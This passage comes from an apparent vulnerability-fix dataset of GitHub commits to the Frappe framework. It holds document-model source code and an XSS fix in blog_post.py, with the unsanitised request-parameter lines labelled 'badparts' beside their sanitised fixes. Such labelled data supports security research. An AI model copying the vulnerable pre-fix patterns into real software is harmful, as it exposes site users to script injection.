constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n"
                }
            },
            "msg": "fix(Barcode): excluding Barcode feild from XSS FIlter (#7605)\n\n(cherry picked from commit e579b8960e1c34e7ad0bf794a10596b40530bc09)"
        }
    },
    "https://github.com/Benefactors/rosling": {
        "2fa19c25066ed17478d683666895e3266936aee6": {
            "url": "https://api.github.com/repos/Benefactors/rosling/commits/2fa19c25066ed17478d683666895e3266936aee6",
            "html_url": "https://github.com/Benefactors/rosling/commit/2fa19c25066ed17478d683666895e3266936aee6",
            "sha": "2fa19c25066ed17478d683666895e3266936aee6",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
            "message": "",
            "files": {
                "/frappe/website/doctype/blog_post/blog_post.py": {
                    "changes": [
                        {
                            "diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"
                            ],
                            "goodparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"
                            ]
                        },
                        {
                            "diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"
                            ],
                            "goodparts": [
                                "\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"
                            ]
                        },
                        {
                            "diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"
                            ],
                            "goodparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) 